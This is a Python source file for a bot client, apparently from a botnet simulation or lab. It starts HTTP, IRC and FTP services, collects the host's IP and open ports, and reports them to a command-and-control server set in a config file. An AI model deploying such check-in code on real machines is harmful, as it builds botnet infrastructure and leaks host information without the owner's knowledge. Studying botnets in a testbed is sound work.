import socket
import subprocess
from irc_server import set_up_irc
from http_server import run_http
from ftp_server import set_up_ftp
from threading import Thread
import time
import json
import sys
import os 

# setting path
sys.path.append('../')
# importing
import config
from utils.script import get_my_ip, exec_cmd

# services to keep active
SERVICES = ["http", "irc", "ftp"]


def get_my_open_ports():
    cmd = ['netstat', '-tulpn', '|', 'grep', 'LISTEN']
    open_ports = exec_cmd(cmd)
    list_ports = []
    for info_line in open_ports.split('\n')[2:]:
        if not info_line:
            continue
        port = info_line.split()[3].split(':')[-1]
        list_ports.append(port)
    # TO DO: change dumps on send line not here in return
    return list_ports

def send_info_to_server(client_socket, my_ip, my_open_ports):
    # print("Sending ", my_ip)
    client_socket.send(str(my_ip).encode())
    data = client_socket.recv(1024).decode()
    if data != "ACK":
        print("Server hasn't received my_ip correctly")

    # print("Sending ", my_open_ports)
    client_socket.send(json.dumps(my_open_ports).encode('utf-8'))
    data = client_socket.recv(1024).decode()
    if data != "ACK":
        print("Server hasn't received my_open_ports correctly")

    return 1

def client_program():
    for s in SERVICES:
        if s == "irc":
            # create a thread to listen on ports
            thread = Thread(target=set_up_irc, args=(os.getpid(),))
            # run the thread
            thread.start()
        elif s == "http":
            # create a thread to listen on ports
            thread = Thread(target=run_http, args=(os.getpid(),))
            # run the thread
            thread.start()
        elif s == "ftp":
            # create a thread to listen on ports
            thread = Thread(target=set_up_ftp, args=(os.getpid(),))
            # run the thread
            thread.start()

    time.sleep(1)
    # server info
    cc = config.server_info["ip"]
    port = config.server_info["port"]

    # get my info
    my_ip = get_my_ip()
    my_open_ports = get_my_open_ports()

    print("bot is connecting to C&C for sending info")
    # connect to server
    client_socket = socket.socket()
    client_socket.connect((cc, port))

    # send my info to server
    send_info_to_server(client_socket, my_ip, my_open_ports)

    client_socket.close()  # close the connection


if __name__ == '__main__':
    client_program()